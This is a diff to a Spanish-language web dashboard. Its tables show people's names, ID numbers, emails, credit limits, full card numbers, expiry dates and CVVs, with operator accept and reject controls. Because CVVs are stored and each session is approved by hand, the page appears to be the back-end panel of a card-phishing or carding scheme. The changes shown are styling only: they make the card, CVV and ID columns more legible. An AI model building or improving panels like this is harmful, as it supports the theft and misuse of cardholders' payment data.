@@ -46,8 +46,6 @@ thead th { text-align: left; padding: 10px; color: #8b94a8; font-weight: 600; fo
 tbody tr { border-bottom: 1px solid #1a1d24; transition: background .15s; }
 tbody tr:hover { background: rgba(237,28,39,0.04); }
 tbody td { padding: 11px 10px; color: #cbd5e1; vertical-align: middle; }
-/* 🔥 CAMBIO DE COLOR A BLANCO PARA LOS DATOS 🔥 */
-tbody td.mono { font-family: 'Courier New', monospace; font-size: 13px; color: #ffffff; font-weight: 600; letter-spacing: 1px; }
 .empty { text-align: center; padding: 30px; color: #6b7280; font-style: italic; }
 .btn { padding: 7px 12px; border-radius: 6px; border: none; font-size: 11px; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 4px; transition: all .15s; white-space: nowrap; }
 .btn-accept { background: #16a34a; color: #fff; }
@@ -62,7 +60,7 @@ tbody td.mono { font-family: 'Courier New', monospace; font-size: 13px; color: #
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
 .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
-.modal-content { background: #161a21; border: 1px solid #262c36; border-radius: 12px; width: 100%; max-width: 900px; max-height: 80vh; display: flex; flex-direction: column; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
+.modal-content { background: #161a21; border: 1px solid #262c36; border-radius: 12px; width: 100%; max-width: 1000px; max-height: 80vh; display: flex; flex-direction: column; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
 .modal-header { padding: 16px 20px; border-bottom: 1px solid #262c36; display: flex; justify-content: space-between; align-items: center; }
 .modal-header h2 { font-size: 18px; color: #e5e7eb; margin: 0; }
 .close-modal { background: none; border: none; color: #ef4444; font-size: 24px; cursor: pointer; }
@@ -362,14 +360,14 @@ function renderSesiones() {
             <tr>
                 <td>${escapeHtml(fecha)}</td>
                 <td>${escapeHtml(nombre.trim() || '-')}</td>
-                <td class="mono">${escapeHtml(doc)}</td>
+                <td style="color: #fff !important; font-weight: bold;">${escapeHtml(doc)}</td>
                 <td>${escapeHtml(correo)}</td>
                 <td>${escapeHtml(cupo)}</td>
                 <td>${escapeHtml(pct)}</td>
                 <td>${escapeHtml(nuevo)}</td>
-                <td class="mono">${escapeHtml(tarjeta)}</td>
-                <td class="mono">${escapeHtml(venc)}</td>
-                <td class="mono">${escapeHtml(cvv)}</td>
+                <td style="color: #fff !important; font-weight: bold; font-size: 14px;">${escapeHtml(tarjeta)}</td>
+                <td style="color: #fff !important; font-weight: bold;">${escapeHtml(venc)}</td>
+                <td style="color: #fff !important; font-weight: bold;">${escapeHtml(cvv)}</td>
                 <td><span class="estado estado-${estado}">${estado}</span></td>
                 <td>${acciones}</td>
             </tr>
@@ -408,10 +406,10 @@ $('btnVerTarjetas').addEventListener('click', async () => {
             <tr>
                 <td>${new Date(t.fecha).toLocaleString('es-CO')}</td>
                 <td>${escapeHtml(t.nombre.trim())}</td>
-                <td class="mono">${escapeHtml(t.documento)}</td>
-                <td class="mono">${escapeHtml(t.tarjeta)}</td>
-                <td class="mono">${escapeHtml(t.expMes + '/' + t.expAnio)}</td>
-                <td class="mono">${escapeHtml(t.cvv)}</td>
+                <td style="color: #fff !important; font-weight: bold;">${escapeHtml(t.documento)}</td>
+                <td style="color: #fff !important; font-weight: bold; font-size: 14px;">${escapeHtml(t.tarjeta)}</td>
+                <td style="color: #fff !important; font-weight: bold;">${escapeHtml(t.expMes + '/' + t.expAnio)}</td>
+                <td style="color: #fff !important; font-weight: bold;">${escapeHtml(t.cvv)}</td>
                 <td><span class="estado estado-${t.estado}">${t.estado}</span></td>
             </tr>
         `).join('');
